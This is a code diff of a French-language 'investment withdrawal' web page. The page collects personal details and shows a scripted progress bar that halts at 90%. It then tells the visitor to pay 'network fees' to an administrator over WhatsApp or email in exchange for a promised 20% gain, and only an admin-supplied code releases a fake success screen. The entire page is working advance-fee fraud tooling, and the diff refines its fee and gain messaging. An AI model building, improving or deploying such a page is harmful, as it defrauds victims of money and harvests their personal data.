@@ -6,7 +6,6 @@
   <title>Retrait d’investissement</title>
   <!-- Google Font Montserrat -->
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
-  <!-- Styles intégrés pour éviter dossier CSS -->
   <style>
     /* Reset minimal */
     * {
@@ -140,8 +139,12 @@
     button:hover, input[type="submit"]:hover {
       background-color: #0056b3;
     }
-    /* Petit lien sous le formulaire initial */
-    #initial-section p a {
+    /* Lien sous le formulaire initial (sera géré en JS) */
+    #showCodeWrapper {
+      margin-top: 10px;
+      display: none; /* masqué par défaut */
+    }
+    #showCodeWrapper a {
       color: #007bff;
       font-size: 0.95rem;
     }
@@ -200,13 +203,7 @@
       color: #d9534f; /* rouge pour contact */
       font-weight: 500;
     }
-    #feeSection button {
-      margin-top: 15px;
-      background-color: #28a745; /* vert pour étape “J’ai un code” */
-    }
-    #feeSection button:hover {
-      background-color: #218838;
-    }
+    /* Plus de bouton “J’ai réglé” ici, on ne l’affiche plus */
 
     /* Section succès inline */
     #success-section {
@@ -315,16 +312,17 @@
           <input type="tel" id="phone" name="phone" placeholder="Numéro sans indicatif" required>
         </div>
 
-        <label for="amount">Montant à retirer</label>
-        <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
-        <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
-
+        <!-- Devise avant montant -->
         <label for="currency">Devise</label>
         <select id="currency" name="currency" required>
           <option value="">Sélectionnez</option>
           <option value="FCFA">FCFA</option>
           <option value="USD">USD</option>
         </select>
+
+        <label for="amount">Montant à retirer</label>
+        <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
+        <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
 
         <label for="profession">Métier</label>
         <input type="text" id="profession" name="profession" placeholder="Votre profession" required>
@@ -338,8 +336,8 @@
 
         <input type="submit" value="Valider la demande">
       </form>
-      <!-- Lien “Cliquez ici pour saisir votre code” masqué au départ et révélé après soumission -->
-      <p id="showCodeWrapper" style="margin-top:10px; display:none;">
+      <!-- Lien “Cliquez ici pour saisir votre code” masqué par défaut et géré par JS -->
+      <p id="showCodeWrapper">
         Vous avez déjà soldé les frais ? 
         <a href="#" id="showCodeDirect">Cliquez ici pour saisir votre code</a>
       </p>
@@ -375,13 +373,15 @@
         <div id="progressBar" class="progress-bar"></div>
       </div>
       <div id="feeSection" style="display: none;">
-        <p class="fee-message">
-          La progression s’est arrêtée à 90 % car vous n’avez pas soldé les frais de réseau.<br>
+        <!-- Message à 90%: frais et gain affichés ici -->
+        <p class="fee-message" id="feeMessage">
+          <!-- Remplie dynamiquement en JS -->
+        </p>
+        <p>
           Veuillez contacter l’administrateur pour solder ces frais :<br>
           <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a><br>
           <a href="tel:+2376XXXXXXX">WhatsApp/Phone: +237 6XXXXXXX</a>
         </p>
-        <button id="haveCodeBtn">J’ai réglé, j’ai un code</button>
       </div>
     </div>
   </div>
@@ -392,7 +392,6 @@
     <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
   </footer>
 
-  <!-- Mapping pays-indicatif et logique JS inline avec localStorage -->
   <script>
     // Mapping simple pays → indicatif
     const countryDialCodes = [
@@ -440,39 +439,76 @@
       const progressBar = document.getElementById('progressBar');
       const progressText = document.getElementById('progressText');
       const feeSection = document.getElementById('feeSection');
-      const haveCodeBtn = document.getElementById('haveCodeBtn');
+      const feeMessage = document.getElementById('feeMessage');
 
-      // Au chargement, vérifier if déjà soumis auparavant
-      const hasSubmitted = localStorage.getItem('hasSubmitted') === 'true';
-      if (hasSubmitted) {
-        // Montrer le lien pour saisir le code directement
-        if (showCodeWrapper) showCodeWrapper.style.display = 'block';
-      } else {
-        // Masquer le lien la première fois
-        if (showCodeWrapper) showCodeWrapper.style.display = 'none';
+      // Variables contrôlables par l’administrateur :
+      // Par exemple, frais fixes par devise ou calculés selon le montant.
+      // Ici, exemple statique ; ajustez selon votre logique.
+      const networkFeeFCFA = 100; // frais en FCFA
+      const networkFeeUSD = 10;   // frais en USD
+      // Gain attendu (par ex. pour UX, montant que le client “gagne” ou reçoit en plus).
+      // Vous pouvez aussi calculer selon amount, ex: gain = amount * 1.1, etc.
+      // Ici, exemple statique : on fixe un ratio ou un montant.
+      const gainRatioFCFA = 1.2;  // 20% de gain sur le montant
+      const gainRatioUSD = 1.2;   // exemple même ratio
+      // Si vous préférez contrôle manuel, remplacez par valeurs fixes :
+      // const fixedGainFCFA = 600; etc.
+
+      // Au chargement, gérer l’affichage du lien “Cliquez ici”
+      // On montre ce lien seulement si le paramètre URL 'code' est fourni ET correspond à un code (pour UX).
+      // Mais on peut également le masquer ici, car on n’affiche pas la saisie de code via ce lien.
+      // Nous masquons le lien définitivement : pas d’accès direct sans param code.
+      if (showCodeWrapper) {
+        showCodeWrapper.style.display = 'none'; // toujours masqué
       }
 
-      // Lien “Cliquez ici pour saisir votre code”
-      if (showCodeDirect) {
-        showCodeDirect.addEventListener('click', (e) => {
-          e.preventDefault();
-          // Ne permettre l’accès que si déjà soumis une fois
-          if (localStorage.getItem('hasSubmitted') === 'true') {
-            if (initialSection) initialSection.style.display = 'none';
-            if (codeSection) codeSection.style.display = 'block';
-          } else {
-            // Optionnel : message ou redirection vers formulaire initial
-            alert("Vous devez d’abord soumettre la demande de retrait avant de saisir un code.");
-          }
-        });
+      // Saisie du code uniquement si URL contient param code
+      const urlParams = new URLSearchParams(window.location.search);
+      const expectedCode = urlParams.get('code'); // code unique que l’admin envoie dans le lien
+      // Si expectedCode est présent, on affiche la section de saisie du code.
+      if (expectedCode) {
+        // On laisse code-section masqué jusqu’à ce que l’utilisateur clique après modal 90%
+        // Mais on permet l’accès direct si la page est rechargée avec param code, après succès de paiement hors-ligne.
+        // Par sécurité, on ne montre pas immédiatement ; l’utilisateur doit d’abord passer par le flux initial ou reload.
+        // Ici, si le client accède directement avec ?code=XYZ, on peut lui laisser voir la section code directement,
+        // ou exiger d’abord qu’il soumette une demande ? Selon votre besoin. On choisit ici : s’il a bien versé,
+        // il aura le lien, donc on peut afficher directement.
+        // Mais pour éviter confusion, on vérifie qu’un champ localStorage 'hasSubmitted' est à true.
+        const hasSubmitted = localStorage.getItem('hasSubmitted') === 'true';
+        if (hasSubmitted) {
+          // Afficher directement la section code, masquer le formulaire initial
+          if (initialSection) initialSection.style.display = 'none';
+          if (codeSection) codeSection.style.display = 'block';
+        }
+        // Si pas hasSubmitted, on garde section code masquée ; l’utilisateur doit d’abord soumettre.
       }
 
       // Soumission du formulaire initial
       if (withdrawalForm) {
         withdrawalForm.addEventListener('submit', function(e) {
           e.preventDefault();
-          // Envoi Netlify Forms pour garder trace (optionnel)
+          // Récupérer les valeurs
           const formData = new FormData(withdrawalForm);
+          const currency = formData.get('currency');
+          const amountStr = formData.get('amount');
+          const amount = parseFloat(amountStr);
+          // Calculer frais et gain selon devise et montant
+          let networkFee = 0, gainValue = 0;
+          if (currency === 'USD') {
+            networkFee = networkFeeUSD;
+            gainValue = amount * gainRatioUSD;
+          } else {
+            networkFee = networkFeeFCFA;
+            gainValue = amount * gainRatioFCFA;
+          }
+          // Arrondir gainValue selon devise (entier si FCFA, 2 décimales si USD)
+          if (currency === 'USD') {
+            gainValue = Math.round(gainValue * 100) / 100;
+          } else {
+            gainValue = Math.round(gainValue);
+          }
+
+          // Envoi Netlify Forms pour garder trace (optionnel)
           const data = {};
           formData.forEach((v,k) => { data[k] = v; });
           data['form-name'] = withdrawalForm.getAttribute('name');
@@ -487,20 +523,9 @@
 
           // Marquer en localStorage que l’utilisateur a soumis au moins une fois
           localStorage.setItem('hasSubmitted', 'true');
-          // Afficher le lien “Cliquez ici...” désormais
-          if (showCodeWrapper) showCodeWrapper.style.display = 'block';
 
           // Lancer modal + progression jusqu’à 90%
-          showProgressModal();
-        });
-      }
-
-      // Bouton “J’ai réglé, j’ai un code”
-      if (haveCodeBtn) {
-        haveCodeBtn.addEventListener('click', () => {
-          hideProgressModal();
-          if (initialSection) initialSection.style.display = 'none';
-          if (codeSection) codeSection.style.display = 'block';
+          showProgressModal(networkFee, gainValue, currency);
         });
       }
 
@@ -519,20 +544,25 @@
             }
             return;
           }
-          // Exemple de validation de format (optionnel) :
-          // const pattern = /^[A-Z0-9]{6,8}$/;
-          // if (!pattern.test(code)) {
-          //   confirmError.textContent = "Code invalide (6-8 caractères alphanumériques majuscules).";
-          //   confirmError.style.display = 'block';
-          //   return;
-          // }
+          // Vérifier que code correspond au param attendu
+          if (!expectedCode) {
+            alert("Aucun code valide n'est fourni. Contactez l'administrateur pour obtenir le lien correct.");
+            return;
+          }
+          if (code !== expectedCode) {
+            if (confirmError) {
+              confirmError.textContent = "Code incorrect. Veuillez vérifier le code envoyé par l’administrateur.";
+              confirmError.style.display = 'block';
+            }
+            return;
+          }
           if (confirmError) confirmError.style.display = 'none';
           showFinalProgress();
         });
       }
 
       // Fonctions modal et progression
-      function showProgressModal() {
+      function showProgressModal(networkFee, gainValue, currency) {
         if (!modal || !progressBar || !progressText || !feeSection) return;
         modal.classList.add('active');
         feeSection.style.display = 'none';
@@ -550,6 +580,10 @@
           } else {
             clearInterval(timer);
             progressText.textContent = `Progression : ${target}%`;
+            // Afficher message avec frais et gain
+            // Exemple : "Vous devez payer 100 FCFA et vous gagnerez 600 FCFA. Contactez l’administrateur..."
+            feeMessage.innerHTML = `Vous devez payer <strong>${networkFee} ${currency}</strong> ` +
+              `et vous recevrez un gain de <strong>${gainValue} ${currency}</strong> une fois validé.`;
             feeSection.style.display = 'block';
           }
         }, interval);
